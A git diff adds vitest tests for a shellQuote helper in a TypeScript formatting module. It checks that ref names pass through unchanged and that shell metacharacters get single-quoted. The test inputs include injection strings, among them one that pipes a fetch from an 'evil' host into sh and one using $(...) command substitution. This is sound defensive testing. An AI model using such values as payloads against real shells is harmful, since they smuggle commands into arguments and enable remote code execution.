@@ -1,10 +1,27 @@
 import { describe, expect, it } from 'vitest'
 import {
-  gitSummary, isStale, matchesFilter, matchNode, prLabel, prTone, relativeTime, safeHref, sessionHint, sessionLabel, sessionTitle, stateTone, statusLabel,
+  gitSummary, isStale, matchesFilter, matchNode, prLabel, prTone, relativeTime, safeHref, sessionHint, sessionLabel, sessionTitle, shellQuote, stateTone, statusLabel,
 } from './format'
 import type { BranchNode, GitInfo, Pr, Session, Worktree } from './types'
 
 const now = new Date('2026-10-02T12:00:00Z')
+
+describe('shellQuote', () => {
+  it('leaves plain ref names and shas alone', () => {
+    expect(shellQuote('feature/LOY-12_fix.1')).toBe('feature/LOY-12_fix.1')
+    expect(shellQuote('aaa1111111111111')).toBe('aaa1111111111111')
+  })
+
+  it.each([
+    ['x;curl${IFS}evil|sh', `'x;curl\${IFS}evil|sh'`],
+    ['a$(touch${IFS}pwned)b', `'a$(touch\${IFS}pwned)b'`],
+    ['back`tick`', "'back`tick`'"],
+    ['amp&and', "'amp&and'"],
+    ["it's", `'it'\\''s'`],
+  ])('single-quotes %s so a shell reads it as one literal word', (input, quoted) => {
+    expect(shellQuote(input)).toBe(quoted)
+  })
+})
 
 describe('relativeTime', () => {
   it.each([
